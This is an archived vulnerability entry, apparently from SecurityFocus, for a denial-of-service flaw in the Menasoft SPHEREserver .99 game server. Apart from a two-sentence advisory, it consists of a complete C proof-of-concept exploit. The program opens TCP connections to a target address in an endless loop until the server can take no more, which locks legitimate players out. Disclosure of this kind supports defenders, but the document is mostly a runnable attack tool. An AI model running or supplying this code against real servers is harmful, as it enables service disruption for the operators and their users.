source: http://www.securityfocus.com/bid/4258/info

Menasoft SPHEREserver .99 is an online role playing game server. It is vulnerable to a denial of service; multiple connections to the server can be made from a single machine, exhausting available connections and denying connections to legitimate users.

/*
 *
 * www.h07.org
 * H Zero Seven
 * Unix Security Research Team
 *
 * Sphere Ultima Online Server - Denial of Service Vulnerability
 * poc-exploit...
 *
 * Simple code to eat all connections from the gameserver, so other
 * peoples could not connect to the server.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <time.h>
#include <sys/time.h>

int Connect(int ip, int port)
{
   int fd;
   struct sockaddr_in tgt;

   fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if (fd<0) return -1;
   memset(&tgt,0,sizeof(struct sockaddr_in));
   tgt.sin_port = htons(port);
   tgt.sin_family = AF_INET;
   tgt.sin_addr.s_addr = ip;
   if (connect(fd,(struct sockaddr*)&tgt,sizeof(struct sockaddr))<0)
return -1;
   return fd;
}

int sprint(int fd, const char *str,...)
{
   va_list args;
   char buf[4096];
   memset(&buf,0,sizeof(buf));
   va_start(args,str);
   vsnprintf(buf,sizeof(buf),str,args);
   return(write(fd,buf,strlen(buf)));
}

int main(int argc, char *argv[])
{
   int fd;
   struct sockaddr_in box;

   fprintf(stderr, "SphereServer DoS Exploit [poc]\n");
   fprintf(stderr, "H Zero Seven - Unix Security Research Team -
www.h07.org\n\n");
   if (argc < 2) {
      fprintf(stderr, "usage: %s <sphere ip> [sphere port]\n",argv[0]);
      return;
   }

   fprintf(stderr,"for the full advisory regarding this vulnerability
visit www.h07.org ... \n");
   fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if (fd<0) {
      perror("socket() ");
      return;
   }

   fprintf(stderr,"Attacking sphere : ");
   for (;;) {
      int sock;

      sock = Connect(inet_addr(argv[1]),(argc>2)?(atoi(argv[2])):3128);
      if (sock<0) {
         sleep(10);
         continue;
      }
       fprintf(stderr, ".*");
   }
}